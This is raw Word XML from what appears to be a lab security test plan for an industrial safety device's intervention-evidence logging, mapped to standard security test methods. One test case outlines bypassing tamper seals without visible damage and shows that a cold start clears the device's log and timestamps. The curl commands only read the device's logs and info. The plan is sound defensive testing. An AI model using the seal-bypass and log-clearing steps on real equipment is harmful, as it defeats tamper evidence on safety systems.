              <w:t xml:space="preserve">Effectiveness (or not) of the </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>evidence function under normal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131C4" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:lastRenderedPageBreak/>
              <w:t>Threat-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>mitigation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verification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EEA2B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SVV-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="79783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98B2F" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74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D6662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Perform an </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>illegitimate</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> intervention avoiding visible seal damage (careful seal/sleeve removal, rotary change incl. → 999), reboot; verify no tamper record and that </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>cold</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> start </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>clears</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the 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DB56A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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Proves G-1 &amp; G-3</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>: unattributable + anti-forensic clearing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56811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MITRE ATT&amp;CK for ICS </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>T0872</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Indicator Removal on Host</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">; OWASP </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>ISTG-PHY</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>; EDR 3.11 detection limb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635BB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SVV-4</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>physical</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>, PA-4)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="10A3C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83CC1" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74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F8691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Time-attribution analysis: capture two events across a cold start; show uptime resets and no absolute time exists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A22F9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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Proves G-2</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>: evidence is not time-referenceable (CR 2.11 unmet)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C6A12" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:t>NIST SP 800-115 §3.2 (log review) + §7 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>evidence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handling</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C7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E168B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SVV-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="63D2CE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58A30" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:t>TS-5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35178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Attempt to invoke the fused diagnostic/FIT function in production (/fit/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>setfit</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, WO/P); confirm rejection and that the exclusion produces </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>no log entry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93026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t>Validates</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> EDR 2.13 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>exclusion</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve">; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>confirms</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> G-4 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>no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evidence</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C7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90D8E" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:t>NIST SP 800-115 §4.2; OWASP FSTM / ISTG-PHY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9BBB5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SVV-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2940EE49" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Environment binding: TS-1/TS-2/TS-4/TS-5 use the </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>management path</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Pi eth1 = 192.168.50.10 → IoT-Core; browser 192.168.50.20) and OT path as needed; TS-3 requires </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>invasive physical access (PA-4)</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and is an isolated-lab, PLC-monitored activity only. </w:t>
      </w:r>
      <w:hyperlink r:id="rId60" w:history="1">
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ifmworld</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-m...epoint.com]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId61" w:history="1">
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Security_T</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>rk_Kali_EN</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | Word]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3B023498" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00000000" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="7A09E1DE">
          <v:rect id="_x0000_i1040" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EA88F65" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 3 — Two-Level Test Catalog</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03921047" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Full entries for the baseline (TS-1), the primary physical gap-proof (TS-3), and the time-attribution gap-proof (TS-4). </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve">TS-2/TS-5 follow </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>the</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> same </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>template</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> on </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>request</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15872D91" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00000000" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="682AEF44">
          <v:rect id="_x0000_i1041" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DEBC8DF" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ003-01 — Baseline: What Evidence the Device Actually Collects</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="598611DD" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00271C74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7758"/>
      </w:tblGrid>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="720C59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68390F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61ABE5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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="4A1118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24B29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A4621" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:t>TC-RQ003-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="1BC59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5253E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266FB" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:t>RQ-003 (EHSR 1.1.9 §2) → CR 2.8 / CR 6.1 → Asset I</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="6E8FE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27194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BE0E7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Repudiation (baseline of available evidence)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="4CE9E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2C105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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74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38ECA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SVV-1</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>Requirements-based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Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="70074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CF119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A20C1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Establish which intervention-evidence mechanisms exist and are readable: the COM Error Log, the I&amp;M0 REVISION_COUNTER, and the I&amp;M4 parameter signature — confirming CR 6.1 (readability) is met while </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>characterising</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the content's limitations.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="5A352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504B7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lastRenderedPageBreak/>
              <w:t xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74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2BB39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1. Read the audit/error log and the I&amp;M records at a known-good baseline. 2. Perform one </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>authorised</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> parameter change. 3. Re-read; confirm REVISION_COUNTER incremented and I&amp;M4 signature changed. 4. Inspect each record for the presence of identity and absolute timestamp.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="5E2F8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257F2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4B1A3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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PASS</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the log and I&amp;M records are readable and the REVISION_COUNTER/I&amp;M4 reflect the change (CR 6.1 + partial CR 2.8 confirmed). </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Documented shortfall</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> no record carries a user identity or absolute timestamp (feeds CR 2.11/2.12 findings).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5F9DCDCB" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74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271C74" w:rsidRPr="00271C74" w14:paraId="4BB3E7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ECDC1B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C4DF35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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="171BF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7947E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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C7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8986A" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:t>TC-RQ003-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="1A432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591F4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D14C8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DUT 192.168.0.2; Pi </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>mgmt</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> eth1 = 192.168.50.10; browser 192.168.50.20; F-Host on OT path</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="6498A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FE763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C81B3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curl / IoT-Core visualizer; TIA Portal for the </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>authorised</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> change</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="20342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19D51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Commands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D1D91" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0BF55044" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"># TC-RQ003-01 Baseline </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>evidence</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>enumeration</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> via IoT-Core</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D14E9FD" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId62" w:history="1">
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/errorlog/loglist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC01_log_base.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06616BFA" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId63" w:history="1">
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/deviceinfo/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC01_iandm_base.json # </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>incl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>I&amp;M0 REVISION_COUNTER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6277F9DC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curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId64" w:history="1">
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/safecom/f_address</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC01_faddr_base.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FB954EC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# --- perform one </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>authorised</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>iPar</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> change in TIA, download, then: ---</w:t>
      </w:r>
    </w:p>
